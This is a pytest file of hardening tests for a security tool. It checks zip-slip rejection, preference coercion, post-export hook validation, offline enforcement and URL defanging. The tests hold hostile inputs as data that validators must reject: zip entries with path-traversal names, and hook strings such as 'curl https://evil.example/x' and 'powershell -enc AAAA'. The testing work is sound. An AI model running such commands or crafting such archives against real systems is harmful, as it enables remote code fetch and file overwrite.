"""Hardening and DX tests: zip-slip, prefs, hooks, offline, defang."""

from __future__ import annotations

import json
import socket
import zipfile
from pathlib import Path

import pytest

from reliquary.core.defang import defang_value, refang
from reliquary.core.export_hook import run_post_export_hook, validate_post_export_hook
from reliquary.core.offline import OfflineViolation, enforce_offline
from reliquary.core.org_profile import UnsafeZipError, load_org_profile
from reliquary.core.prefs import _coerce_value, load_prefs
from reliquary.core.qr_scan import decode_qr_payloads


def test_org_profile_zip_slip_rejected(tmp_path: Path) -> None:
    zpath = tmp_path / "evil.zip"
    with zipfile.ZipFile(zpath, "w") as zf:
        zf.writestr("../evil.txt", "nope")
        zf.writestr("allowlist_extra.txt", "ok.example\n")
    with pytest.raises(UnsafeZipError):
        load_org_profile(zpath)


def test_org_profile_zip_absolute_rejected(tmp_path: Path) -> None:
    zpath = tmp_path / "abs.zip"
    with zipfile.ZipFile(zpath, "w") as zf:
        # posix-style absolute member
        zf.writestr("/tmp/evil.txt", "nope")
    with pytest.raises(UnsafeZipError):
        load_org_profile(zpath)


def test_prefs_coerce_bad_types() -> None:
    assert _coerce_value("ui_scale", "1.5", 1.0) == 1.5
    assert _coerce_value("ui_scale", "nope", 1.0) == 1.0
    assert _coerce_value("max_workers", "4", 0) == 4
    assert _coerce_value("max_workers", "x", 0) == 0
    assert _coerce_value("hide_rewriter", "false", True) is False
    assert _coerce_value("hide_rewriter", "yes", False) is True
    assert _coerce_value("appearance_mode", "neon", "dark") == "dark"
    assert _coerce_value("ioc_density", "compact", "normal") == "compact"


def test_prefs_load_coerces(tmp_path: Path, monkeypatch) -> None:
    prefs_file = tmp_path / "ui_prefs.json"
    prefs_file.write_text(
        json.dumps({"ui_scale": "2", "max_workers": "3", "hide_private": "0"}),
        encoding="utf-8",
    )
    monkeypatch.setattr("reliquary.core.prefs.prefs_path", lambda: prefs_file)
    data = load_prefs()
    assert data["ui_scale"] == 2.0
    assert data["max_workers"] == 3
    assert data["hide_private"] is False


def test_hook_blocks_curl() -> None:
    err = validate_post_export_hook("curl https://evil.example/x")
    assert err and "blocked" in err


def test_hook_blocks_powershell() -> None:
    err = validate_post_export_hook("powershell -enc AAAA")
    assert err and "blocked" in err


def test_hook_blocks_bash_and_metachar() -> None:
    assert validate_post_export_hook("bash -c 'id'")
    assert validate_post_export_hook("/bin/sh script.sh")
    assert validate_post_export_hook("python app_hook.py | tee out")


def test_run_hook_allow_external(tmp_path: Path) -> None:
    import sys

    export = tmp_path / "out.json"
    export.write_text("{}", encoding="utf-8")
    marker = tmp_path / "m.txt"
    script = tmp_path / "h.py"
    script.write_text(
        "import sys\nfrom pathlib import Path\n"
        f"Path(r'{marker.as_posix()}').write_text(sys.argv[-1], encoding='utf-8')\n",
        encoding="utf-8",
    )
    msg = run_post_export_hook(
        [sys.executable, str(script)],
        export,
        allow_external=True,
    )
    assert msg and msg.startswith("hook ok")
    assert marker.is_file()


def test_hook_disabled_env(monkeypatch) -> None:
    monkeypatch.setenv("RELIQUARY_DISABLE_EXPORT_HOOK", "1")
    msg = run_post_export_hook("whatever.exe", "out.json", allow_external=True)
    assert msg == "hook disabled"


def test_offline_blocks_connect() -> None:
    enforce_offline()
    with pytest.raises(OfflineViolation):
        socket.create_connection(("127.0.0.1", 9), timeout=0.1)


def test_refang_and_defang_roundtrip_ish() -> None:
    raw = "https://evil.example/phish"
    fang = defang_value(raw)
    assert "hxxps" in fang
    assert "[.]" in fang
    assert refang("hxxp://evil[.]example") == "http://evil.example"
    assert refang("user[@]evil[.]com") == "user@evil.com"


def test_qr_decode_empty_bytes() -> None:
    payloads, notes = decode_qr_payloads(b"not-an-image")
    assert payloads == []
    assert isinstance(notes, list)
